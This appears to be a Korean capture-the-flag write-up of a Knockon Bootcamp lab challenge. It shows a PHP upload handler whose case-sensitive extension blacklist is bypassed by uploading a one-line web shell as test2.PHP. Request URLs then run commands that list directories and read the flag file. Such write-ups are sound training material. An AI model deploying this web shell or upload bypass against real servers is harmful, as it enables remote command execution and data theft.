---
title: "[Writeup] Knockon Bootcamp - 10.2 Can't access revenge!"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - File Upload
  - Command Injection
last_modified_at: 2024-09-15T21:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10019/>

![10.2 Can't access revenge! 1](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_1.png)

![10.2 Can't access revenge! 2](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_2.png)

|

|

|

### 목표

---

서버 파일에서 flag 찾기

|

### 공격 기법

---

File Upload

Command Injection

|

|

|

## 문제 코드

```php
<?php
require ("db.php");

$blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml","pht","pHp","pHp5","pHp4","pHp3","pHp2","pHp1","Html","Htm","pHtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","jSp","jSpx","jSpa","jSw","jSv","jSpf","jHtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","aSp","aSpx","aSa","aSax","aScx","aShx","aSmx","cEr","sWf","swf","htaccess");

if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['title'] && $_POST['content']) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {

        $uploadPath = './uploads/';
        $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
        $fileName = $_FILES['file']['name'];

        if (in_array($fileExtension, $blacklist)) {
            echo "<script>alert('Invalid file type.');</script>";
            echo "<script>location.href='/index.php'</script>";
        } else {
            if (!is_dir($uploadPath)) {
                mkdir($uploadPath, 0777, true);
            }

            $title = $_POST['title'];
            $stmt = $conn->prepare("SELECT COUNT(*) FROM upload WHERE title = ? OR filename = ?");
            $stmt->bind_param('ss', $title, $fileName);
            $stmt->execute();
            $stmt->bind_result($count);
            $stmt->fetch();
            $stmt->close();

            if ($count > 0) {
                echo "<script>alert('Title or filename already exists.');</script>";
                echo "<script>location.href='/index.php'</script>";
            } else {
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath . $fileName)) {
                    try {
                        $content = $_POST['content'];
                        $stmt = $conn->prepare("INSERT INTO upload (title, content, filename) VALUES (?, ?, ?)");
                        $stmt->bind_param('sss', $title, $content, $fileName);
                        $stmt->execute();
                        $stmt->close();

                        echo "<script>alert('File uploaded successfully.');</script>";
                        echo "<script>location.href='/dashboard.php?title=$title'</script>";
                    } catch (mysqli_sql_exception $e) {
                        echo "Query failed: " . $e->getMessage();
                    }
                } else {
                    echo "<script>alert('File upload failed.');</script>";
                    echo "<script>location.href='/index.php'</script>";
                }
            }
        }
    }
} else {
?>
<!DOCTYPE html>
<html>

<head>
    <title>Upload File</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #ffe6e6; /* Pink background */
            color: #4a4a4a; /* Dark grey text */
            font-family: 'Arial', sans-serif;
        }

        .card {
            border: none;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .card-body {
            background-color: #fff3cd; /* Light yellow */
            color: #4a4a4a; /* Dark grey text */
            border-radius: 15px;
        }

        .btn-primary {
            background-color: #ffcccb; /* Light pink */
            border-color: #ffcccb; /* Light pink */
            color: #4a4a4a; /* Dark grey text */
            border-radius: 25px;
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
        }

        .btn-primary:hover {
            background-color: #ff9999; /* Slightly darker pink */
            border-color: #ff9999; /* Slightly darker pink */
        }

        .form-control, .form-control-file {
            border: 1px solid #ffcccb; /* Light pink border */
            border-radius: 10px;
            padding: 10px;
        }

        .form-control:focus, .form-control-file:focus {
            border-color: #ff9999; /* Slightly darker pink border on focus */
            box-shadow: 0 0 0 0.2rem rgba(255, 153, 153, 0.25); /* Light pink shadow on focus */
        }

        .container {
            margin-top: 5rem;
        }

        h2 {
            color: #ff6666; /* Bold pink color */
            font-weight: bold;
        }

        label {
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div class="container mt-5">
        <div class="row">
            <div class="col-md-6 offset-md-3">
                <div class="card">
                    <div class="card-body">
                        <h2 class="text-center">Upload</h2>
                        <form action="/upload.php" method="post" enctype="multipart/form-data">
                            <div class="form-group">
                                <label for="title">Title</label>
                                <input type="text" id="title" name="title" class="form-control" required>
                            </div>
                            <div class="form-group">
                                <label for="content">Details</label>
                                <textarea id="content" name="content" rows="4" class="form-control" required></textarea>
                            </div>
                            <div class="form-group">
                                <label for="file">Attach Image</label>
                                <input type="file" id="file" name="file" class="form-control-file" required>
                            </div>
                            <div class="text-center">
                                <input type="submit" value="Upload" class="btn btn-primary">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-5">
            <div class="col-md-6 offset-md-3">
                <div class="card">
                    <div class="card-body">
                        <h2 class="text-center">Delete All Uploaded Files</h2>
                        <form action="/delete_files.php" method="post">
                            <div class="text-center">
                                <input type="submit" value="Delete All Files" class="btn btn-danger">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>

<?php
}
?>
```

|

|

|

## 코드 분석

### upload.php

---

```php
$blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml","pht","pHp","pHp5","pHp4","pHp3","pHp2","pHp1","Html","Htm","pHtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","jSp","jSpx","jSpa","jSw","jSv","jSpf","jHtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","aSp","aSpx","aSa","aSax","aScx","aShx","aSmx","cEr","sWf","swf","htaccess");
```

`htaccess`가 추가됨

|

```php
$fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
```

여전히 대문자 가능

|

|

|

## Exploit

```php
<?php
  echo system($_GET['cmd'])
?>
```

`*.PHP` (대문자) 파일 업로드

|

```sh
http://war.knock-on.org:10019/uploads/test2.PHP?cmd=ls
```

![10.2 Can't access revenge! 3](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_2.png)

커맨드 실행 가능

|

```sh
http://war.knock-on.org:10019/uploads/test2.PHP?cmd=ls%20../../../../
```

![10.2 Can't access revenge! 4](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_3.png)

flag 발견

|

```sh
http://war.knock-on.org:10019/uploads/test2.PHP?cmd=cat%20../../../../flag
```

![10.2 Can't access revenge! 5](/assets/images/writeup/web-hacking/knock-on/10-2_FILE_4.png)

|

|

|

## Payload

### test2.PHP

---

```php
<?php
	echo system($_GET['cmd'])
?>
```

|

### URL

---

```sh
http://war.knock-on.org:10019/uploads/test2.PHP?cmd=cat%20../../../../flag
```

|

|

### FLAG

---

```sh
K0{you_solve_this_with_higher_case?}
```

|

---